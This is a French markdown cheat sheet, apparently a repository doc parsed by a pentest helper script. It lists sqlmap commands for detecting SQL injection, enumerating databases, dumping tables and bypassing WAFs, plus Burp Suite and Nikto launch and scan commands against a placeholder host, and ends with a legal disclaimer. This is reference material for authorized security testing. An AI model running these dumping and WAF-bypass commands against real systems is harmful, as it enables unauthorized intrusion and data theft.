**Chemin :**  
`docs/Couche5-7_TApplication/cheat-couche_Application.md`

```markdown
# Couche 5-7 (Application) – Attaques et Outils

**Version Testée :**
- Sqlmap 1.6.x
- Burp Suite Community 2021.10
- Nikto 2.5.x

**Description :**  
Ce document recense les outils et attaques disponibles pour la couche Application (couches 5 à 7) du modèle OSI.  
Cette couche concerne l’interaction avec les applications web et les services, incluant l’injection SQL, la manipulation de requêtes HTTP et la découverte de vulnérabilités dans les serveurs web.  
Le script automatisé analysera ce fichier pour :
- Lister les outils disponibles (sections marquées par **"### Outil:"**),
- Afficher, pour chaque outil, les attaques possibles (sections marquées par **"#### Attaque:"**),
- Proposer les commandes associées pour chaque attaque (commandes présentées dans des blocs de code sous **"###### Commande:"** avec une section "Détails :").

Vous pourrez enrichir ce fichier ultérieurement sans modifier le script.

---

### Outil: Sqlmap
**Description :**  
Sqlmap est un outil d’automatisation pour détecter et exploiter des vulnérabilités SQL dans les applications web.

#### Attaque: Détection d'injection SQL
*Détails de l'attaque :*  
Détecter automatiquement les vulnérabilités d'injection SQL sur une URL cible.
##### Commandes Clés
**Commande: Détecter une injection SQL**
```bash
sqlmap -u "http://site.com/page?id=1" --batch
```
Détails :
- Utilise le mode batch pour automatiser les choix.
- Cible : http://site.com/page?id=1

#### Attaque: Extraction des bases de données
*Détails de l'attaque :*  
Extraire la liste des bases de données présentes sur le serveur vulnérable.
##### Commandes Clés
**Commande: Extraire les bases de données**
```bash
sqlmap -u "http://site.com/page?id=1" --dbs
```
Détails :
- Affiche la liste des bases de données disponibles.

#### Attaque: Dump d'une table spécifique
*Détails de l'attaque :*  
Extraire le contenu d'une table précise après avoir sélectionné la base de données.
##### Commandes Clés
**Commande: Dump d'une table spécifique**
```bash
sqlmap -u "http://site.com/page?id=1" -D nom_de_base -T nom_de_table --dump
```
Détails :
- Remplacez "nom_de_base" et "nom_de_table" par les valeurs correspondantes.

#### Attaque: Bypass WAF
*Détails de l'attaque :*  
Utiliser des techniques de contournement pour échapper aux Web Application Firewalls.
##### Commandes Clés
**Commande: Bypass WAF avec tamper**
```bash
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
```
Détails :
- Utilise le script tamper "space2comment" pour contourner certaines protections.

---

### Outil: Burp Suite
**Description :**  
Burp Suite est une plateforme intégrée pour tester la sécurité des applications web, offrant des fonctionnalités de proxy, scanner et intruder.

#### Attaque: Analyse et Scan Web
*Détails de l'attaque :*  
Utiliser Burp Suite pour scanner les vulnérabilités d'une application web.
##### Commandes Clés
**Commande: Lancer Burp Suite Community**
```bash
java -jar burpsuite_community.jar
```
Détails :
- Démarrage de l'interface graphique de Burp Suite Community.
- Nécessite Java installé sur le système.

#### Attaque: Interception de requêtes HTTP
*Détails de l'attaque :*  
Intercepter et modifier en temps réel les requêtes HTTP pour tester la robustesse des contrôles d'accès.
##### Commandes Clés
**Commande: Lancer Burp avec configuration personnalisée**
```bash
java -jar burpsuite_community.jar --config-file=burp_config.json
```
Détails :
- Utilise un fichier de configuration (burp_config.json) pour lancer Burp Suite avec des paramètres pré-définis.

---

### Outil: Nikto
**Description :**  
Nikto est un scanner de serveurs web open source qui identifie les problèmes de sécurité et les vulnérabilités connues dans les configurations de serveurs web.

#### Attaque: Scan de vulnérabilités sur un serveur web
*Détails de l'attaque :*  
Exécuter un scan complet des vulnérabilités d’un serveur web.
##### Commandes Clés
**Commande: Lancer un scan avec Nikto**
```bash
nikto -h http://site.com
```
Détails :
- Cible : http://site.com.
- Analyse des vulnérabilités connues du serveur web.

---

## Précautions Légales & Disclaimer
**Attention :**  
L’utilisation de ces outils et commandes doit être réalisée dans un cadre légal et exclusivement en environnement de test. Toute utilisation malveillante est strictement interdite.

---

## Références & Ressources
- [Sqlmap Official Website](https://sqlmap.org/)
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
- [Nikto Project](https://cirt.net/Nikto2)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
```
